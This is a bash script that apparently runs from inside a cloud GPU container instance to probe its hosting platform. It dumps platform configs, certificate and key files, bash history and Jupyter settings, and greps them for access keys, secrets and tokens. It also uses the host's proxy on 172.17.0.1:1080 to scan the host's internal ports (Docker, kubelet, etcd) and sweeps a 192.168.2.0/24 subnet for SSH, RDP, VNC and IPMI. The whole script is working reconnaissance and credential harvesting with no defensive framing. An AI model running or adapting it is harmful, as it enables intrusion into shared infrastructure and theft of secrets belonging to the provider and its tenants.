#!/bin/bash
set +e
echo "###P3START $(date -u)"
echo "=== JFS-CONFIG ==="; cat /root/onethingai-fs/.config 2>&1 | head -60
echo "=== JFS-CONFIG-STAT ==="; ls -la /root/onethingai-fs/.config /.cloud_storage_disabled 2>&1; cat /.cloud_storage_disabled 2>&1 | head
echo "=== CERT-PKG ==="; find /.onething/instance/tools/pkg/cert -maxdepth 3 -type f 2>/dev/null | head -20
for f in $(find /.onething/instance/tools/pkg/cert -maxdepth 3 -type f 2>/dev/null | head -10); do echo "--- $f"; file "$f" 2>/dev/null; head -c 300 "$f" 2>/dev/null; echo; done
echo "=== PROXY-PKG ==="; find /.onething/instance/tools/pkg/proxy -maxdepth 3 -type f 2>/dev/null | head; for f in $(find /.onething/instance/tools/pkg/proxy -maxdepth 3 -type f -name "*.json" -o -name "*.conf" -o -name "*.yaml" 2>/dev/null | head -5); do echo "--- $f"; cat "$f" 2>/dev/null | head -40; done
echo "=== CONFIGMAP ==="; ls -la /.onething/instance/configmap/; for f in /.onething/instance/configmap/*; do echo "--- $f"; head -c 600 "$f" 2>/dev/null; echo; done
echo "=== OT-PKG-CONFS ==="; find /.onething/instance/tools/pkg -maxdepth 4 \( -name "*.json" -o -name "*.conf" -o -name "*.yaml" -o -name "*.yml" -o -name "*.pem" -o -name "*.crt" -o -name "*.key" \) 2>/dev/null | head -40
echo "=== KUBE-STRINGS ==="; grep -rIl "kube\|KUBE\|serviceaccount" /.onething/instance/tools/pkg 2>/dev/null | head -10; grep -rIo "https://[0-9a-zA-Z_.:-]*\(6443\|10250\|8443\)" /.onething 2>/dev/null | sort -u | head -10
echo "=== SUPERVISOR ==="; ls /etc/supervisor/conf.d/; for f in /etc/supervisor/conf.d/*.conf; do echo "--- $f"; cat "$f"; done 2>/dev/null | head -80
echo "=== BASHHIST-TAIL ==="; tail -c 4000 /root/.bash_history 2>&1
echo "=== TOKENS-GREP ==="; grep -rIEl "access_key|AccessKey|SECRET|secret_key|token|TOKEN" /root/.jupyter /root/.config /.onething/instance/configmap /etc/supervisor 2>/dev/null | head -20
echo "=== JUPYTER-CFG ==="; sed -n '1,60p' /root/.jupyter/jupyter_notebook_config.py 2>&1
echo "=== NODEID ==="; cat /tmp/node_id 2>&1; echo; cat /etc/hostname; cat /etc/resolv.conf
echo "=== HOSTLOOP-SCAN via 1080 ==="
python3 - <<'PY'
import socket
ports=[22,2375,2376,2377,2379,2380,3000,6443,8080,8090,8095,8200,8265,8443,8500,9090,9100,9400,10248,10250,10255,10257,10259,11434,18048,18049,18080,1080,2019,8188,8888,6817,6818]
def test(p):
    try:
        s=socket.create_connection(("172.17.0.1",1080),timeout=5); s.settimeout(6)
        s.sendall(b"CONNECT 127.0.0.1:%d HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n"%p)
        buf=b""
        while b"\r\n\r\n" not in buf:
            d=s.recv(4096)
            if not d: break
            buf+=d
        hdr=buf.split(b"\r\n")[0].decode('latin1')
        s.close()
        return p,hdr
    except Exception as e:
        return p,"ERR:"+type(e).__name__
for p in ports:
    r=test(p); print(r[0],r[1])
PY
echo "=== 192.168.2.0/24 SWEEP ==="
python3 - <<'PY'
import socket,concurrent.futures
def chk(t):
    h,p=t
    try:
        s=socket.create_connection((h,p),timeout=2); s.settimeout(3)
        try: b=s.recv(80)
        except: b=b""
        s.close(); return (h,p,"OPEN",b[:60])
    except: return None
tg=[("192.168.2.%d"%i,p) for i in range(1,255) for p in (22,80,443,623,5900,3389)]
with concurrent.futures.ThreadPoolExecutor(max_workers=150) as ex:
    for r in ex.map(chk,tg):
        if r: print(r[0]+":"+str(r[1]),r[2],r[3])
PY
echo "###P3END $(date -u)"
